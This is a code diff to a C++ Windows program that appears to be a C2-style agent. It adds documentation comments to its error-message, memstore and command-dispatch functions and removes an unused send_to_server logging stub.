@@ -38,6 +38,13 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "_debug/debug.h"
 #include "defense/winapi.h"
 //move to own file?
+
+/**
+ * @brief Get the Error Message from a windows error code
+ * 
+ * @param dwErrorCode 
+ * @return std::string The error message as a string
+ */
 std::string GetErrorMessage(DWORD dwErrorCode) {
     if (dwErrorCode == ERROR_SUCCESS) {
         return "Success";
@@ -77,6 +84,12 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
 }
 
 //Helpers
+/**
+ * @brief Replaces a string with the associated data stored in the memstore
+ * 
+ * @param memstore_name_with_deref_symbol A string, the name of the memstore item to dereference (*mydata)
+ * @return std::vector<uint8_t> The data stored in the memstore
+ */
 std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
     DEBUG_LOG("[deref_memstore_content]: Dereferencing " << memstore_name_with_deref_symbol << " from memstore");
 
@@ -128,6 +141,12 @@ bool IsStrategyValid(const std::string& strategy, const std::string& setting_key
 
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
+/**
+ * @brief The command tree for acting based on the provided command
+ * 
+ * @param task_data A nlohmann::json object, which contains the task
+ * @return nlohmann::json The task results object
+ */
 nlohmann::json command_tree(nlohmann::json task_data) {
     //Note, if ever a vector of tasks, do a for loop over said vector here - or have caller call command_tree multiple times. both are fair options. 
     std::string task_name = task_data["task"]["task_name"];
@@ -789,10 +808,4 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         return result;
     }
 
-}
-
-//placeholder for  a beacon printf style func?
-int send_to_server(std::string output) {
-    DEBUG_LOG(output);
-    return 0;
 }
